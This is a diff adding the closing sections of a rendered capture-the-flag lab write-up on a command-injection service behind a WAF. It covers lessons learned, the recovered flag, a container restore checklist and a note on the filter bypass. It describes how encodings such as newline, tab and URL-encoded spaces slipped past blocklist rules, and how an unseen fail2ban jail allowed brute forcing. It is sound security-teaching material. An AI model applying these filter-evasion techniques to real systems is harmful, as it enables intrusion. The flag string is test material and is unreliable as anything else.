+<p><strong>2. Output of an inner command is re-split by the outer command — a positive that reads as a
+negative.</strong> Because <code>index.php:65</code> builds <code>ls -lah &lt;dir&gt;</code>, <strong>any</strong> spaces in my payload's output
+re-enter <code>ls</code> as separate arguments. Consequences observed: <code>ls: invalid line width: '-r--r--'</code>,
+and <code>ls: cannot access 'uid=33(www-data)'</code>. <code>tr -d [:space:]</code> did not fix it (the outer <code>ls</code>
+re-quoted the token), and even base64 needed <strong>two</strong> decode passes because the outer <code>ls</code> wrapped
+the token in quotes. <strong>Cost: ~6 wasted probes.</strong> The fix is to always collapse payload output to a
+single space-free token before it re-enters the sink.</p>
+<p><strong>3. <code>403</code> is not a verdict, and this lab has two different 403s.</strong> Three WAF blocks shared one
+body hash and the blacklist a second. Without that baseline, &quot;the WAF blocked me&quot; and &quot;the
+blacklist blocked me&quot; are indistinguishable, and they point at different bypasses. This is the
+corpus's existing <code>403</code>/<code>429</code> row in <code>method/retrieval-hazards.md</code> made concrete: the numbers that
+are expected working conditions are not verdicts, and here the <em>body</em> is the discriminator.</p>
+<p><strong>4. <code>fail2ban-client status</code> reporting a running jail was a false positive — the same shape as
+defect 1.</strong> <code>Jail is in operation now</code> plus <code>Currently banned: 0</code> reads as &quot;no bans, therefore
+control working, therefore I may attack at full rate&quot;. It is the opposite: the jail had <strong>never
+observed an event</strong>, because its log backend does not exist in the container. <strong>The negative that
+lied was a status field, not an absence.</strong> The control that caught it was feeding it 16 real
+failures and watching <code>Total failed</code> stay at 0. <code>Total failed</code> is the field with meaning; a running
+jail is not.</p>
+<p><strong>5. The reward was verified by search, not assumption.</strong> Work count: <code>grep -rl &quot;FLAG{&quot;</code> over
+<code>/home /opt /var/www /root /srv /mnt /usr/local /etc</code> — <strong>564 files scanned, 1 hit</strong>
+(<code>[lab-home]/vault/flag.txt</code>). A second search through the injection against <code>/var/www</code> returned no
+additional marker.</p>
+<p><strong>6. Redirect-following discipline (corpus defect 2), applied preemptively.</strong> Every probe used
+<code>curl --resolve</code> with the host in the URL and <strong>no</strong> <code>-H</code>, so no <code>-H</code>-dropping path was involved
+(corpus defect 4) and the <code>303 → internal.dl</code> redirects were never silently followed to a <code>200</code>
+login page. Vhost rows were hashed from the <strong>raw</strong> response, so a followed redirect would have
+changed the byte counts and hashes — and did not, except where a <code>303</code> was the finding.</p>
+<p><strong>7. <code>id</code> measured as the identity, not as root.</strong> The sink's identity came from the sink's own
+<code>id</code> output (<code>uid=33(www-data)</code>), and the SSH identity was confirmed three ways (<code>id</code>, <code>id -u</code>
+→ <code>1001</code>, <code>whoami</code> → <code>vault</code>) rather than inferred from a successful login.</p>
+<hr />
+<h2 id="reward">Reward</h2>
+<p><strong>Present, literal.</strong> <code>[lab-home]/vault/flag.txt</code>, reachable only as <code>vault</code> (uid 1001):</p>
+<pre><code>FLAG{CMD_1NJ3CT10N_M4ST3R_W4F_BYP4SS3D}
+</code></pre>
+<p><strong>Absence of any further reward, with the search that established it:</strong> <code>grep -rl &quot;FLAG{&quot;</code> across
+<code>/home /opt /var/www /root /srv /mnt /usr/local /etc</code> — 564 files scanned, <strong>1</strong> hit. No second
+flag, no platform-side token, no alternate reward file. The file's own &quot;read this file →
+<code>/flag.txt</code>&quot; instruction was <strong>checked and is wrong</strong>: <code>/flag.txt</code> returns <code>No such file or directory</code>; the real path is <code>[lab-home]/vault/flag.txt</code>.</p>
+<hr />
+<h2 id="restore">Restore</h2>
+<pre><code>$ docker rm -f internal_container
+$ docker run -d --name internal_container internal:latest
+</code></pre>
+<p><strong>Verified positively, not by absence:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Container recreated from the image</td>
+<td>new id <code>1326303467b0…</code> (pre-restore was <code>e4f550b14a47…</code>), <code>running</code></td>
+</tr>
+<tr>
+<td>Service answering again</td>
+<td><code>dir=/tmp</code> → <code>200</code>, <code>ls</code> output from <code>/tmp</code></td>
+</tr>
+<tr>
+<td><strong>Filter restored, not just absent</strong></td>
+<td><code>dir=/;</code> → <code>403</code> <code>{&quot;error&quot;:&quot;Request blocked. Suspicious operator detected.&quot;}</code></td>
+</tr>
+<tr>
+<td>Marker artefact gone</td>
+<td><code>ls -a /var/www/html</code> → <code>.htaccess</code>, <code>index.html</code> only</td>
+</tr>
+<tr>
+<td>Brute-force counters reset</td>
+<td><code>fail2ban-client status sshd</code> → <code>Currently failed: 0</code>, <code>Total failed: 0</code></td>
+</tr>
+</tbody>
+</table>
+<p>Recreated from the image rather than by undoing edits. <strong>No artefacts left in the container</strong>: the
+one file I created (<code>/var/www/html/DL218_aad201a29bc1ea93</code>) was removed and its absence positively
+verified before the restore, and the docroot listing after restore shows only shipped files.
+Local scratch (<code>/tmp/[tool]/</code>) holds the harness and the recovered wordlist only.</p>
+<hr />
+<h2 id="next-step">Next step</h2>
+<p>The class row in <a href="../labs.html"><code>../INDEX.md</code></a> points at lab 283 (<code>Evasión de filtro · previene vs detecta</code>). This lab <strong>extends</strong> it rather than duplicating it. The addition the parent
+should carry:</p>
+<blockquote>
+<p><strong>A blocklist names what you already know; the bypass is always an unlisted encoding, and the
+rule generalises from there.</strong> Read the filter as a <em>value</em>, then ask what the <strong>shell</strong> (or
+parser, or browser) resolves <strong>after</strong> the check. Four rules here died on representation alone:
+<code>'\n'</code> is not <code>0x0A</code>, and <code>'+'</code>/<code>'%20'</code>/<code>'%09'</code> are encodings of a value that no longer exists
+by the time the filter runs. Discriminate block from wrong-payload by <strong>body hash</strong> — two layers
+of one WAF produced two byte-distinguishable 403s.</p>
+</blockquote>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
